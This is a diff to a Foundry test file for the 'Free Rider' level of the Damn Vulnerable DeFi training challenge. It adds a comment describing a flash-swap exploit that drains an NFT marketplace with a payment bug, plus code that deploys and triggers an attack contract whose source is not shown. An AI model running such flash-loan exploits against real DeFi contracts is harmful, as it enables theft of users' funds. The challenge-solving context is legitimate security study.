@@ -9,6 +9,7 @@ import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../sr
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
+import {FreeRiderAttack} from "../../../src/Contracts/free-rider/FreeRiderAttack.sol";
 
 contract FreeRider is Test {
     // The NFT marketplace will have 6 tokens, at 15 ETH each
@@ -31,6 +32,8 @@ contract FreeRider is Test {
     IUniswapV2Pair internal uniswapV2Pair;
     IUniswapV2Factory internal uniswapV2Factory;
     IUniswapV2Router02 internal uniswapV2Router;
+
+    FreeRiderAttack internal freeRiderAttack;
     WETH9 internal weth;
     address payable internal buyer;
     address payable internal attacker;
@@ -129,6 +132,16 @@ contract FreeRider is Test {
 
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
+    /**
+     * POC for attack
+     * Take a flashloan of 15ETH from uniswap
+     * Use that ETH to buy Each of the NFT's. With Each buy you will receive your 15 ETH back because there's a bug that transfers the new owner 15 ETH instead of the old owner 
+     * Deposit the NFT's back into the buyer contract to receive your 45 ETH 
+     * Pay off your flashloan and fee using the new 45 eth you just received 
+     * Win
+     * 
+     */
+
 
     function testExploit() public {
         /**
@@ -136,10 +149,18 @@ contract FreeRider is Test {
          */
         vm.startPrank(attacker, attacker);
 
+        // initralize free rider attack contract, this is where the flashswaps will execute
+        freeRiderAttack = new FreeRiderAttack(address(uniswapV2Pair), address(freeRiderNFTMarketplace), address(weth), address(damnValuableNFT), address(freeRiderBuyer));
+
+        // intialize flashswap 
+        freeRiderAttack.initiateSwap();
+
+
         vm.stopPrank();
         /**
          * EXPLOIT END *
          */
+        // uncomment when done setting up exploit
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
